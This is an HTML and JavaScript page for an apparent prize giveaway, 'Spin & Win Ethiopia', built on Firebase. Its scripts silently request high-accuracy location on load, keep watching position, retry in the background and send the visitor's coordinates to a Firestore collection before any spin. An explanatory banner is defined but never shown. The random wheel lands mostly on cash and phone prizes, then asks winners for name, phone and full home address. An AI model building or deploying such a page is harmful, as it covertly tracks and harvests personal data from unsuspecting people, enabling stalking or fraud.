<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spin & Win Ethiopia</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-firestore-compat.js"></script>
    <style>
        .wheel {
            width: min(95vw, 500px);
            height: min(95vw, 500px);
            position: relative;
            border-radius: 50%;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
            transform: rotate(0deg);
        }
        .wheel-container {
            position: relative;
            width: min(95vw, 500px);
            margin: 0 auto;
        }
        .wheel-center {
            position: absolute;
            width: clamp(36px, 8vw, 50px);
            height: clamp(36px, 8vw, 50px);
            background: white;
            border-radius: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10;
            border: 5px solid #f3f4f6;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
        }
        .pointer {
            position: absolute;
            top: calc(-1 * clamp(16px, 4vw, 20px));
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: clamp(14px, 3.5vw, 20px) solid transparent;
            border-right: clamp(14px, 3.5vw, 20px) solid transparent;
            border-top: clamp(28px, 7vw, 40px) solid #ef4444;
            z-index: 5;
        }
        .segment {
            position: absolute;
            width: 50%;
            height: 50%;
            transform-origin: 100% 100%;
            left: 0;
            top: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            text-align: center;
            padding-left: 18%;
            box-sizing: border-box;
            color: white;
            font-weight: bold;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
        }
        .segment-text {
            transform: rotate(90deg) translateY(-20px);
            transform-origin: left center;
            white-space: nowrap;
            font-size: clamp(11px, 2.8vw, 14px);
        }
        @media (max-width: 640px) {
            .segment { padding-left: 15%; }
        }
    </style>
</head>
<body class="bg-gradient-to-br from-blue-50 via-white to-purple-50 min-h-screen flex flex-col items-center justify-center p-4">
    <div class="max-w-2xl w-full bg-white/90 backdrop-blur rounded-2xl shadow-2xl p-6 border border-gray-100">
        <h1 class="text-3xl sm:text-4xl font-extrabold text-center text-gray-800 mb-2">Spin & Win Ethiopia</h1>
        <p class="text-center text-gray-500 mb-6">Win cash, phones, and more! One spin per session.</p>
        
        <div class="wheel-container mb-8">
            <div class="pointer"></div>
            <div class="wheel" id="wheel">
                <!-- Segments will be added by JavaScript -->
            </div>
            <div class="wheel-center"></div>
        </div>

        <div class="text-center">
            <button id="spinBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-8 rounded-full text-lg transition-all duration-300 shadow-lg hover:shadow-xl w-full sm:w-auto">
                SPIN THE WHEEL
            </button>
            <div id="result" class="mt-6 text-xl font-semibold text-gray-700 min-h-8"></div>
        </div>
    </div>

    <!-- Winner Details Modal -->
    <div id="winnerModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center p-4 z-50">
        <div class="bg-white rounded-2xl shadow-xl w-full max-w-xl">
            <div class="p-4 border-b border-gray-100 flex items-center justify-between">
                <h3 class="text-lg font-bold text-gray-800">Winner Details</h3>
                <button id="closeModal" class="text-gray-400 hover:text-gray-600" aria-label="Close">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
                </button>
            </div>
            <form id="winnerForm" class="p-4 space-y-4">
                <div class="bg-blue-50 border border-blue-100 text-blue-700 p-3 rounded-lg text-sm">
                    Congratulations! You won: <span id="wonPrize" class="font-semibold"></span>. Please provide your details for delivery/contact.
                </div>
                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Full Name</label>
                        <input id="fullName" type="text" required class="mt-1 w-full border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" placeholder="Your full name" />
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Phone (+251)</label>
                        <input id="phone" type="tel" pattern="^\+?251[0-9]{9}$" required class="mt-1 w-full border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" placeholder="+2519XXXXXXXX" />
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Region (Kilil)</label>
                        <select id="region" required class="mt-1 w-full border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500">
                            <option value="">Select region</option>
                            <option>Addis Ababa</option>
                            <option>Oromia</option>
                            <option>Amhara</option>
                            <option>Tigray</option>
                            <option>Sidama</option>
                            <option>Somali</option>
                            <option>Benishangul-Gumuz</option>
                            <option>Southern Ethiopia</option>
                            <option>South West Ethiopia Peoples</option>
                            <option>Gambela</option>
                            <option>Harari</option>
                            <option>Afar</option>
                        </select>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">City / Sub-city</label>
                        <input id="city" type="text" required class="mt-1 w-full border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" placeholder="e.g., Addis Ababa / Bole" />
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Woreda</label>
                        <input id="woreda" type="text" required class="mt-1 w-full border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Kebele</label>
                        <input id="kebele" type="text" required class="mt-1 w-full border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
                    </div>
                    <div class="sm:col-span-2">
                        <label class="block text-sm font-medium text-gray-700">House No. / Landmark</label>
                        <input id="houseNumber" type="text" required class="mt-1 w-full border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" placeholder="e.g., House 123, near Friendship Mall" />
                    </div>
                </div>
                <div class="flex items-center justify-end gap-2 pt-2">
                    <button type="button" id="cancelModal" class="px-4 py-2 rounded-lg border border-gray-300 text-gray-600 hover:bg-gray-50">Cancel</button>
                    <button type="submit" class="px-4 py-2 rounded-lg bg-blue-600 text-white hover:bg-blue-700">Submit</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Firebase configuration
        const firebaseConfig = {
        apiKey: "AIzaSyCO35JZoFm240m3SFLjGGzgFcsypAr_YkQ",
        authDomain: "spin-5f3eb.firebaseapp.com",
        projectId: "spin-5f3eb",
        storageBucket: "spin-5f3eb.firebasestorage.app",
        messagingSenderId: "124051980951",
        appId: "1:124051980951:web:cffee7317163063d991fd2",
        measurementId: "G-EG4SBN9C0H"
    };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        // expose for waitForDbReady()
        window.db = db;

        // Ensure the user is authenticated (anonymous) so rules allowing auth pass
        // Safe to call early; if already signed in, this is a no-op
        (async () => {
            try {
                if (!firebase.auth().currentUser) {
                    await firebase.auth().signInAnonymously();
                }
            } catch (e) {
                console.warn('Anonymous sign-in failed:', e?.message || e);
            }
        })();

        // Game configuration
        const segments = [
            { text: "ETB 50", color: "#10B981" },
            { text: "Try Again", color: "#9CA3AF" },
            { text: "ETB 100", color: "#F59E0B" },
            { text: "Free Spin", color: "#3B82F6" },
            { text: "Samsung S24 Ultra", color: "#8B5CF6" },
            { text: "ETB 500", color: "#EF4444" },
            { text: "ETB 1000", color: "#14B8A6" },
            { text: "Gift Hamper", color: "#EC4899" }
        ];

        // Game state
        let isSpinning = false;
        let spinCount = 0;
        let userLocation = null; // legacy var, kept for backwards compat
        let lastValidLocation = null; // preferred source for writes
        let geoWatchId = null;
        let userId = localStorage.getItem('userId');
        let initialLocationSent = false; // session-only flag; send once per page load
        let hasRequestedLocationPrompt = false; // avoid re-prompting when switching tabs/apps
        
        // Generate a unique user ID if not exists
        if (!userId) {
            userId = 'user_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('userId', userId);
        }

        // Get user's location (one-shot)
        function requestLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    userLocation = { lat: null, lng: null };
                    return resolve(userLocation);
                }
                if (hasRequestedLocationPrompt) {
                    // We've already prompted this session; do not trigger another prompt
                    return resolve(userLocation);
                }
                hasRequestedLocationPrompt = true;
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userLocation = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude
                        };
                        // update lastValidLocation if valid
                        if (isValidLocation(userLocation)) lastValidLocation = userLocation;
                        // Mimic "Location found!" -> send to admin in background after brief wait
                        setTimeout(async () => {
                            // Background: wait for DB then try to send
                            await waitForDbReady();
                            sendInitialLocationOnce();
                        }, 800);
                        resolve(userLocation);
                    },
                    (error) => {
                        console.error('Error getting location:', error);
                        userLocation = { lat: null, lng: null };
                        resolve(userLocation);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        // Start/Stop continuous watcher to improve accuracy and capture fix proactively
        function startLocationWatcher() {
            if (!navigator.geolocation || geoWatchId !== null) return;
            geoWatchId = navigator.geolocation.watchPosition(
                (position) => {
                    const loc = { lat: position.coords.latitude, lng: position.coords.longitude };
                    if (isValidLocation(loc)) {
                        lastValidLocation = loc;
                        // If we haven't sent the initial location row yet, do it now
                        sendInitialLocationOnce();
                    }
                },
                (err) => {
                    console.warn('watchPosition error:', err?.message || err);
                },
                { enableHighAccuracy: true, maximumAge: 1000, timeout: 20000 }
            );
        }

        function stopLocationWatcher() {
            if (geoWatchId !== null && navigator.geolocation) {
                navigator.geolocation.clearWatch(geoWatchId);
                geoWatchId = null;
            }
        }

        // Background retries to acquire permission/fix without any user click
        let bgRetryTimer = null;
        function startBackgroundRetries(totalMs = 30000, periodMs = 2000) {
            if (bgRetryTimer) return;
            const endAt = Date.now() + totalMs;
            bgRetryTimer = setInterval(async () => {
                if (initialLocationSent || Date.now() > endAt) {
                    clearInterval(bgRetryTimer);
                    bgRetryTimer = null;
                    return;
                }
                // Do not call requestLocation repeatedly to avoid permission prompts; rely on watcher
                await sendInitialLocationOnce();
            }, periodMs);
        }
        function stopBackgroundRetries() {
            if (bgRetryTimer) {
                clearInterval(bgRetryTimer);
                bgRetryTimer = null;
            }
        }

        function waitForValidLocation(timeoutMs = 5000) {
            return new Promise((resolve) => {
                if (isValidLocation(lastValidLocation)) return resolve(true);
                const start = Date.now();
                const iv = setInterval(() => {
                    if (isValidLocation(lastValidLocation)) {
                        clearInterval(iv);
                        resolve(true);
                    } else if (Date.now() - start >= timeoutMs) {
                        clearInterval(iv);
                        resolve(false);
                    }
                }, 200);
            });
        }

        // Helpers to validate and convert to GeoPoint safely
        function isValidLocation(loc) {
            if (!loc) return false;
            const { lat, lng } = loc;
            if (typeof lat !== 'number' || typeof lng !== 'number') return false;
            if (!isFinite(lat) || !isFinite(lng)) return false;
            // Treat (0,0) as invalid to avoid placeholder location
            if (lat === 0 && lng === 0) return false;
            return true;
        }

        function geoPointOrNull(loc) {
            return isValidLocation(loc)
                ? new firebase.firestore.GeoPoint(loc.lat, loc.lng)
                : null;
        }

        // Ensure Firebase/Firestore is ready before writes
        async function waitForDbReady(timeoutMs = 10000) {
            const start = Date.now();
            while (Date.now() - start < timeoutMs) {
                if (window.firebase && firebase.apps && firebase.apps.length && window.db) return true;
                // eslint-disable-next-line no-await-in-loop
                await new Promise(r => setTimeout(r, 100));
            }
            console.warn('waitForDbReady: timed out waiting for Firebase init');
            return !!(window.firebase && firebase.apps && firebase.apps.length && window.db);
        }

        // Write the initial location row exactly once when a valid fix exists
        async function sendInitialLocationOnce() {
            if (initialLocationSent) return;
            const loc = isValidLocation(lastValidLocation) ? lastValidLocation : (isValidLocation(userLocation) ? userLocation : null);
            if (!isValidLocation(loc)) return; // wait until we have a valid fix
            try {
                await db.collection('spins').add({
                    userId,
                    prize: null,
                    status: 'location',
                    location: geoPointOrNull(loc),
                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                });
                initialLocationSent = true;
                console.log('Initial location sent');
            } catch (e) {
                console.error('Failed to write initial location row', e);
            }
        }

        // Enable flow on explicit user action (banner button)
        async function enableLocationFlow() {
            if (initialLocationSent) return hideLocationBanner();
            await requestLocation();
            startLocationWatcher();
            // Wait a bit for a better fix, then send
            await waitForValidLocation(4000);
            await sendInitialLocationOnce();
            hideLocationBanner();
        }

        function showLocationBanner() {
            if (initialLocationSent) return;
            // Create a simple top banner
            const banner = document.createElement('div');
            banner.id = 'locBanner';
            banner.className = 'fixed top-0 left-0 right-0 z-50 bg-blue-600 text-white text-sm px-4 py-3 shadow flex items-center justify-between';
            banner.innerHTML = `
                <span class="mr-3">Enable location to capture your coordinates for the admin dashboard.</span>
                <div class="flex items-center gap-2">
                  <button id="locEnableBtn" class="bg-white text-blue-700 font-medium px-3 py-1 rounded hover:bg-blue-50">Enable Location</button>
                  <button id="locDismissBtn" class="border border-white/60 text-white px-2 py-1 rounded hover:bg-white/10">Dismiss</button>
                </div>
            `;
            document.body.appendChild(banner);
            document.getElementById('locEnableBtn').addEventListener('click', enableLocationFlow);
            document.getElementById('locDismissBtn').addEventListener('click', hideLocationBanner);
        }

        function hideLocationBanner() {
            const el = document.getElementById('locBanner');
            if (el) el.remove();
        }

        // Save spin result to Firestore as a separate row
        async function saveSpinResult(prize) {
            try {
                await db.collection('spins').add({
                    userId,
                    prize,
                    status: 'completed',
                    location: geoPointOrNull(lastValidLocation),
                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                });
                console.log('Spin result saved:', prize);
            } catch (error) {
                console.error('Error saving spin result:', error);
            }
        }

        // Create wheel segments
        function createWheel() {
            const wheel = document.getElementById('wheel');
            const segmentAngle = 360 / segments.length;
            
            segments.forEach((segment, index) => {
                const segmentEl = document.createElement('div');
                const rotation = index * segmentAngle;
                const skew = 90 - segmentAngle;
                
                segmentEl.className = 'segment';
                segmentEl.style.transform = `rotate(${rotation}deg) skewY(${skew}deg)`;
                segmentEl.style.backgroundColor = segment.color;
                
                const textEl = document.createElement('div');
                textEl.className = 'segment-text';
                textEl.textContent = segment.text;
                
                segmentEl.appendChild(textEl);
                wheel.appendChild(segmentEl);
            });
        }

        // Spin the wheel
        async function spinWheel() {
            if (isSpinning) return;
            // Do not prompt here; use lastValidLocation captured on load

            const wheel = document.getElementById('wheel');
            const spinBtn = document.getElementById('spinBtn');
            const resultEl = document.getElementById('result');
            
            isSpinning = true;
            spinBtn.disabled = true;
            resultEl.textContent = '';
            
            // Random segment (0 to segments.length - 1)
            const segmentIndex = Math.floor(Math.random() * segments.length);
            const segmentAngle = 360 / segments.length;
            
            // Calculate rotation (5 full rotations + offset to land on segment)
            const currentRotation = getRotationValue(wheel.style.transform);
            const targetRotation = 1800 + (360 - (segmentIndex * segmentAngle + segmentAngle / 2));
            const totalRotation = currentRotation + targetRotation;
            
            // Apply rotation with easing
            wheel.style.transform = `rotate(${totalRotation}deg)`;
            
            // After animation completes
            setTimeout(() => {
                isSpinning = false;
                spinBtn.disabled = false;
                
                const prize = segments[segmentIndex].text;
                resultEl.textContent = `You won: ${prize}!`;
                
                // Save result to Firestore
                saveSpinResult(prize);
                
                spinCount++;

                // Prompt for details only on winning outcomes
                const nonWinning = ["Try Again", "Free Spin"];
                if (!nonWinning.includes(prize)) {
                    document.getElementById('wonPrize').textContent = prize;
                    openWinnerModal();
                }
            }, 5000); // Match this with CSS transition duration
        }

        // Helper function to get current rotation value
        function getRotationValue(transform) {
            if (!transform || transform === 'none') return 0;
            const values = transform.split('(')[1].split(')')[0].split(',');
            const a = parseFloat(values[0]);
            const b = parseFloat(values[1]);
            const angle = Math.round(Math.atan2(b, a) * (180/Math.PI));
            return angle < 0 ? angle + 360 : angle;
        }

        // Initialize the game
        document.addEventListener('DOMContentLoaded', () => {
            createWheel();
            // Automatic location enable: start watcher and request permission immediately
            startLocationWatcher();
            requestLocation().then(async () => {
                // wait a little for a better fix, then attempt to send once
                await waitForValidLocation(5000);
                await waitForDbReady();
                await sendInitialLocationOnce();
            });
            // Also observe permission changes so we can auto-send once it's granted
            monitorGeolocationPermission();
            // Kick off background retries so we don't depend on any button
            startBackgroundRetries(45000, 2500);
            
            // Add click event to spin button
            document.getElementById('spinBtn').addEventListener('click', spinWheel);
            // Modal events
            document.getElementById('closeModal').addEventListener('click', closeWinnerModal);
            document.getElementById('cancelModal').addEventListener('click', closeWinnerModal);
            document.getElementById('winnerForm').addEventListener('submit', submitWinnerDetails);
        });

        window.addEventListener('beforeunload', () => {
            stopLocationWatcher();
            stopBackgroundRetries();
        });

        // Observe the browser geolocation permission and react immediately when granted
        async function monitorGeolocationPermission() {
            try {
                if (!navigator.permissions) return; // not supported in some browsers
                const perm = await navigator.permissions.query({ name: 'geolocation' });
                const handle = async () => {
                    if (perm.state === 'granted') {
                        // Ensure watcher is on, request a fresh reading, then try send
                        startLocationWatcher();
                        await waitForValidLocation(5000);
                        await waitForDbReady();
                        await sendInitialLocationOnce();
                    }
                };
                perm.onchange = handle;
                // Run once with current state
                handle();
            } catch (e) {
                console.warn('Permission API unavailable or failed:', e);
            }
        }

        // Modal controls
        function openWinnerModal() {
            const modal = document.getElementById('winnerModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }
        function closeWinnerModal() {
            const modal = document.getElementById('winnerModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
            (document.getElementById('winnerForm')).reset();
        }

        // Save winner details to Firestore
        async function submitWinnerDetails(e) {
            e.preventDefault();
            const data = {
                userId,
                prize: document.getElementById('wonPrize').textContent,
                fullName: document.getElementById('fullName').value.trim(),
                phone: document.getElementById('phone').value.trim(),
                region: document.getElementById('region').value,
                city: document.getElementById('city').value.trim(),
                woreda: document.getElementById('woreda').value.trim(),
                kebele: document.getElementById('kebele').value.trim(),
                houseNumber: document.getElementById('houseNumber').value.trim(),
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                location: userLocation ? new firebase.firestore.GeoPoint(userLocation.lat, userLocation.lng) : null,
            };
            try {
                await db.collection('winners').add(data);
                closeWinnerModal();
                alert('Thanks! Your details have been submitted.');
            } catch (err) {
                console.error('Error saving winner details', err);
                alert('Could not submit details. Please try again.');
            }
        }
    </script>
</body>
</html>